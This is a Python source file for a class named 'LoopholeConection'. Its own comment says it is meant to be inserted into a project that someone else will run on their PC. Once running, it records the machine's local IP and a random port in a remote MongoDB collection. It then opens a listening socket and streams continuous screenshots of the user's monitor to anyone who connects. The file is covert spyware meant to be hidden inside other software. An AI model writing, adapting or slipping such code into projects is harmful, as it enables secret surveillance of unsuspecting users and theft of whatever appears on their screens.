import pickle
import cv2
import numpy as np
import socket
import struct
import mss
import random
from pymongo import MongoClient


#This is the file that you are going to insert into some project that someone is going to use on the pc.

class LoopholeConection:
    def __init__(self):
        self.url = '' #Mongodb connection URL to add ip and port to make the connection on the device.
        self.database = MongoClient(self.url)
        self.cluster = self.database[""] #Cluster
        self.collection = self.cluster[""] #Collection

    def obter_ip_local(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                ip_local = s.getsockname()[0]
            return ip_local
        except Exception as e:
            return f"Erro ao obter IP: {e}"

    def insert_dates(self, ip, port):
        self.collection.insert_one({'ip':ip, 'port':port})

    def get_dates(self, ip):
        dates = self.collection.find_one({'ip':ip})
        return dates

    def sys_connection(self, HOST, PORT):
        print('connected')
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((HOST, PORT))
        server.listen(1)
        conn, addr = server.accept()
        with mss.mss() as sct:
            monitor = sct.monitors[1]

            try:
                while True:
                    screenshot = sct.grab(monitor)
                    frame = np.array(screenshot)
                    _, frame_encoded = cv2.imencode('.jpg', frame)

                    data = pickle.dumps(frame_encoded)
                    frame_size = len(data)
                    conn.sendall(struct.pack("L", frame_size) + data)

            except Exception as e:
                print(f"Erro no servidor: {e}")

            finally:
                conn.close()
                server.close()

    def _connection_location(self):
        server_ip = self.obter_ip_local()
        PORT = random.randint(1000,9999)
        HOST = '0.0.0.0'
        if not self.collection.find_one({'ip':server_ip}):
            self.insert_dates(server_ip, PORT)
            self.sys_connection(HOST, PORT)
        else:
            self.sys_connection(HOST, self.get_dates(server_ip)["port"])